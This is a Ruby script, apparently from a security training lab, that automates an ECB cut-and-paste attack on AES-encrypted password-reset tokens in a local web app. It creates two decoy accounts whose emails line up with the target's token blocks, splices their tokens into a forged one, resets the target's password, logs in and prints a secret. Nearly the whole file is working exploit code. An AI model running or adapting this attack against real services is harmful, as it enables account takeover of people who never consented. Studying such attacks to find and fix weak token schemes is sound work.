
# We know the token format is:
#   email=j.osterman@watchmen.net&expires=1425382831
# 
# Splitting into 16byte (i.e 16 char blocks):
# 
# |------1-------||-------2------||--------3------|
# email=j.osterman@watchmen.net&expires=1425382831
# =
# |------1-------|
# email=j.osterman@catchmen.net&expires=1425382831
# +
#                 |-------2------||--------3------|
# email=a.osterman@watchmen.net&expires=1425382831
                
require 'mechanize'
require 'base64'
require 'uri'
require '../helpers/token'

TARGET  = 'j.osterman@watchmen.net'
PASS    = '123456789'

SPIKES  = [ 
  'j.osterman@catchmen.net',
  'a.osterman@watchmen.net'
]

Mechanize.new.instance_eval do
  # For each spike account grab the password reset token 
  aes_tokens = SPIKES.map do |spike|

    # Create the account
    get 'http://localhost:3000/users/new'

    page.forms.first.tap do |f|
      f['user[email]']                 = spike
      f['user[password]']              = PASS
      f['user[password_confirmation]'] = PASS
      f.submit
    end

    # Reset the password
    get '/password_reset_request/new'

    page.forms.first.tap do |f|
      f['email']      = spike
      f.submit
    end

    # Grab the token we are given
    puts '[+] Enter the latest password reset token'

    # Return an AES token object
    Helpers::Token::AES.new(gets.strip)
  end

  # Create the new token by piecing together the pieces of the spikes
  puts '[+] Piecing together target token'
  new_token = aes_tokens[0].to_blocks[0] +
              aes_tokens[1].to_blocks[1..-1].join

  # Encode the new token for transport
  new_token = URI.escape(Base64.urlsafe_encode64(new_token))

  # Reset the password
  puts '[+] Resetting the targets password'
  get '/password_reset/new?token=' + new_token

  page.forms.first.tap do |f|
    f['user[password]']              = PASS
    f['user[password_confirmation]'] = PASS
    f.submit
  end

  # Sign in as target
  get '/session/new'

  page.forms.first.tap do |f|
    f['email']    = TARGET
    f['password'] = PASS
    f.submit
  end

  # Print the secret
  puts '[+] Success!'
  puts page.search('.secret').text.strip
end


